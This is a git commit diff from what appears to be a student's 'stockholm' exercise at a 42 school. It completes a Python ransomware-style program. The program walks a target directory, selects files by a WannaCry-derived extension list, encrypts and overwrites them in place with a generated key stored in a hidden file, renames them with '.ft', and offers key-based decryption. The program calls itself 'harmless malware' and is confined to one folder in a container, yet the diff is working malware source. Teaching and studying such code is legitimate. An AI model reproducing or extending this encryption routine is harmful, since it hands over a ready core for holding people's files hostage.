6555e86d71d2a5c51dd004c9d49c7b41f126320c
maott <maott@student.42berlin.de>
2024-11-23 12:18:40 +0100

    finish stockholm

--- Dockerfile
+++ Dockerfile
@@ -24,4 +24,4 @@ COPY ./infection /root/infection
 
 # docker build -t stockholm_image .
 # docker run -it --rm stockholm_image
-# docker run -it --rm -v "$HOME:/root/workspace" stockholm_image
+# docker run -it --rm -v "$(pwd):/root" stockholm_image
--- stockholm.py
+++ stockholm.py
@@ -10,11 +10,32 @@ RED = "\033[31m"
 GREEN = "\033[32m"
 YELLOW = "\033[33m"
 
-PROGRAM_VERSION = "1.0.0"
-SECRET_KEY_FILE = "key.stockholm"
+PROGRAM_VERSION = "0.0.42"
+SECRET_KEY_FILE = ".key.stockholm"
 DIRECTORY = os.path.expanduser("~/infection")
 
-def encrypt_files(secret_key):
+WANNACRY_EXTENSIONS = {
+    ".123", ".3dm", ".3ds", ".3g2", ".3gp", ".602", ".7z", ".aes", ".ai", ".asc",
+    ".asf", ".asm", ".asp", ".avi", ".bak", ".bat", ".bmp", ".brd", ".bz2", ".c",
+    ".cgm", ".class", ".cmd", ".cpp", ".cs", ".csv", ".csr", ".db", ".dbf", ".dif",
+    ".dip", ".djvu", ".doc", ".docb", ".docm", ".docx", ".dot", ".dotm", ".dotx",
+    ".dch", ".dwg", ".edb", ".eml", ".fla", ".flv", ".frm", ".gif", ".gpg", ".gz",
+    ".h", ".hwp", ".ibd", ".iso", ".jar", ".java", ".jpeg", ".jpg", ".js", ".jsp",
+    ".key", ".lay", ".lay6", ".ldf", ".m3u", ".m4u", ".mdb", ".mdf", ".mid", ".mkv",
+    ".mov", ".mp3", ".mp4", ".mpg", ".msg", ".mml", ".myd", ".myi", ".nef", ".odb",
+    ".odg", ".odp", ".ods", ".odt", ".onetoc2", ".otp", ".ots", ".ott", ".p12",
+    ".pas", ".paq", ".pdf", ".pem", ".pfx", ".php", ".pl", ".png", ".pot", ".potm",
+    ".potx", ".ppam", ".pps", ".ppsm", ".ppsx", ".ppt", ".pptm", ".pptx", ".ps1",
+    ".psd", ".pst", ".py", ".rb", ".rtf", ".sldm", ".sldx", ".slk", ".sln", ".snt",
+    ".sql", ".sqlite3", ".sqlitedb", ".stc", ".std", ".sti", ".stw", ".svg", ".swf",
+    ".sxc", ".sxd", ".sxi", ".sxm", ".tar", ".tbk", ".tga", ".tif", ".tiff", ".tgz",
+    ".txt", ".uot", ".vbs", ".vcd", ".vdi", ".vmdk", ".vmx", ".vob", ".vsd", ".vsdx",
+    ".wav", ".wb2", ".wks", ".wk1", ".wma", ".wmv", ".xla", ".xlam", ".xlc", ".xlm",
+    ".xls", ".xlsb", ".xlsm", ".xlsx", ".xlt", ".xltm", ".xltx", ".xlw", ".xsf",
+    ".zip"
+}
+
+def process_files(secret_key, reverse):
     box = secret.SecretBox(secret_key)
 
     if not os.path.exists(DIRECTORY):
@@ -25,83 +46,103 @@ def encrypt_files(secret_key):
         for file_name in files:
             file_path = os.path.join(root, file_name)
 
-            if file_name.endswith(".ft"):
-                print(f"{YELLOW}Skipping already encrypted file: {file_path}{RESET}")
-                continue
+            if reverse:
+                if not file_name.endswith(".ft"):
+                    print(f"{YELLOW}Skipping unencrypted file: {file_path}{RESET}")
+                    continue
 
-            try:
-                with open(file_path, 'rwb') as file:
-                    file_data = file.read()
+                decrypt_files(box, file_path)
 
-                    encrypted_data = box.encrypt(file_data)
+            else:
+                file_ext = os.path.splitext(file_name)[1].lower()
 
-                    file.write(encrypted_data)
-                    # rename the file by adding .ft extension
+                if file_ext not in WANNACRY_EXTENSIONS:
+                    print(f"{YELLOW}Skipping file with unsupported extension: {file_path}{RESET}")
+                    continue
 
-                    print(f"{GREEN}Encrypted: {file_path} -> {file_path}{RESET}")
+                encrypt_files(box, file_path)
 
-            except Exception as e:
-                print(f"{RED}Failed to encrypt {file_path}: {e}{RESET}")
+def encrypt_files(box, file_path):
+    try:
+        with open(file_path, 'rb+') as file:
+            file_data = file.read()
+            encrypted_data = box.encrypt(file_data)
+            
+            file.seek(0)
+            file.truncate()
+            file.write(encrypted_data)
 
-def decrypt_files(secret_key):
-    box = secret.SecretBox(secret_key)
+        os.rename(file_path, file_path + ".ft")
+        print(f"{GREEN}Encrypted: {file_path} -> {file_path}.ft{RESET}")
 
-    if not os.path.exists(DIRECTORY):
-        print(f"{RED}Directory not found: {DIRECTORY}{RESET}")
-        return
+    except Exception as e:
+        print(f"{RED}Failed to encrypt {file_path}: {e}{RESET}")
 
-    for root, _, files in os.walk(DIRECTORY):
-        for file_name in files:
-            file_path = os.path.join(root, file_name)
+def decrypt_files(box, file_path):
+    try:
+        with open(file_path, 'rb+') as file:
+            file_data = file.read()
+            decrypted_data = box.decrypt(file_data)
 
-            if not file_name.endswith(".ft"):
-                print(f"{YELLOW}Skipping uncrypted file: {file_path}{RESET}")
-                continue
+            file.seek(0)
+            file.truncate()
+            file.write(decrypted_data)
 
-            try:
-                with open(file_path, 'rwb') as file:
-                    file_data = file.read()
+        new_path = file_path.rsplit(".ft", 1)[0]
+        os.rename(file_path, new_path)
 
-                    decrypted_data = box.encrypt(file_data)
+        print(f"{GREEN}Decrypted: {file_path} -> {new_path}{RESET}")
 
-                    file.write(decrypted_data)
+    except Exception as e:
+        print(f"{RED}Failed to decrypt {file_path}: {e}{RESET}")
 
-                    print(f"{GREEN}Encrypted: {file_path} -> {file_path}{RESET}")
-
-            except Exception as e:
-                print(f"{RED}Failed to decrypt {file_path}: {e}{RESET}")
-
-def get_secret_key():
-
-    # if exists -> open -> return key
-    # elif not reverse -> create
-    # else (reverse) -> error
-
+def create_key():
     if os.path.exists(SECRET_KEY_FILE):
         try:
             with open(SECRET_KEY_FILE, 'rb') as file:
                 secret_key = file.read()
 
             if len(secret_key) != secret.SecretBox.KEY_SIZE:
-                print(f"{RED}Invalid key size. Ensure the key is 32 bytes long.{RESET}")
+                print(f"{RED}Invalid key size in {SECRET_KEY_FILE}. Ensure the key is 32 bytes long.{RESET}")
                 exit(1)
 
-        except Exception as e:
-            print(f"{RED}An error occurred: {e}{RESET}")
+            print(f"{YELLOW}Using existing key from {SECRET_KEY_FILE}.{RESET}")
+            return secret_key
 
-        print(f"{YELLOW}Secret key already exists at {SECRET_KEY_FILE}. No new key generated.{RESET}")
+        except Exception as e:
+            print(f"{RED}Failed to load key from {SECRET_KEY_FILE}: {e}{RESET}")
+            exit(1)
     else:
         secret_key = utils.random(secret.SecretBox.KEY_SIZE)
 
         with open(SECRET_KEY_FILE, 'wb') as file:
             file.write(secret_key)
 
-        print(f"{GREEN}Secret key saved successfully to {SECRET_KEY_FILE}.{RESET}")
+        print(f"{GREEN}Generated and saved new key to {SECRET_KEY_FILE}.{RESET}")
+        return secret_key
 
-    return secret_key
+def load_key(key_path):
+    if not os.path.exists(key_path):
+        print(f"{RED}Key file not found: {key_path}{RESET}")
+        exit(1)
+
+    try:
+        with open(key_path, 'rb') as file:
+            secret_key = file.read()
+
+        if len(secret_key) != secret.SecretBox.KEY_SIZE:
+            print(f"{RED}Invalid key size in {key_path}. Ensure the key is 32 bytes long.{RESET}")
+            exit(1)
+
+        print(f"{YELLOW}Secret key loaded successfully from {SECRET_KEY_FILE}.{RESET}")
+        return secret_key
+
+    except Exception as e:
+        print(f"{RED}Failed to load key from {key_path}: {e}{RESET}")
+        exit(1)
 
 def parse_arguments():
-    parser = argparse.ArgumentParser(description="harmless malware")
+    parser = argparse.ArgumentParser(description="Harmless malware")
 
     parser.add_argument("-v", "--version", action="version", version=f"{YELLOW}%(prog)s {PROGRAM_VERSION}{RESET}", help="Show the program version.")
     parser.add_argument("-r", "--reverse", metavar="KEY_FILE", type=str, help="Path to the file containing the key to reverse the infection.")
@@ -116,12 +157,12 @@ def main():
         devnull = os.open(os.devnull, os.O_WRONLY)
         os.dup2(devnull, sys.stdout.fileno())
 
-    secret_key = get_secret_key()
-
     if args.reverse:
-        decrypt_files(secret_key)
+        secret_key = load_key(args.reverse)
     else:
-        encrypt_files(secret_key)
+        secret_key = create_key()
+
+    process_files(secret_key, args.reverse)
 
 if __name__ == "__main__":
     main()
